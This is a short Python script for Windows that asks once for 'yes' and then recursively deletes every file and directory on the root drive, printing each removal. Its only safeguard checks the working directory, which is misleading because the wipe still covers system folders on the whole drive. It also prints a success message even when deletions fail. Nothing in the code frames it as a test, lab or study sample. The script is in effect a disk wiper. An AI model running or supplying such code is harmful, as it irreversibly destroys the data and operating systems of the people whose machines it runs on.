import os
import platform

def is_windows():
    return platform.system().lower() == 'windows'

def is_windows_system_directory(directory):
    if is_windows():
        windows_system_dirs = [
            os.environ.get('SYSTEMROOT'),
            os.path.join(os.environ.get('SYSTEMROOT'), 'System32'),
            os.path.join(os.environ.get('SYSTEMROOT'), 'SysWow64')  # for 64-bit Windows
        ]
        return directory.lower() in map(str.lower, windows_system_dirs)
    return False

def delete_files(folder_path):
    try:
        for root, dirs, files in os.walk(folder_path, topdown=False):
            for file_name in files:
                file_path = os.path.join(root, file_name)
                os.remove(file_path)
                print(f"Deleted: {file_path}")

            for dir_name in dirs:
                dir_path = os.path.join(root, dir_name)
                os.rmdir(dir_path)
                print(f"Deleted: {dir_path}")

    except Exception as e:
        print(f"Error: {e}")

def main():
    if not is_windows():
        print("This script is designed for Windows systems. Exiting.")
        return

    if is_windows_system_directory(os.getcwd()):
        print("Please run the script from a non-system directory. Exiting.")
        return

    # Ask for confirmation only once
    confirmation = input("This script will attempt to permanently delete files from the system. Are you sure you want to proceed? Type 'yes' to continue: ")

    if confirmation.lower() == 'yes':
        root_drive = os.path.abspath(os.sep)
        delete_files(root_drive)
        print("Files deleted successfully!")
    else:
        print("Operation canceled.")

if __name__ == "__main__":
    main()
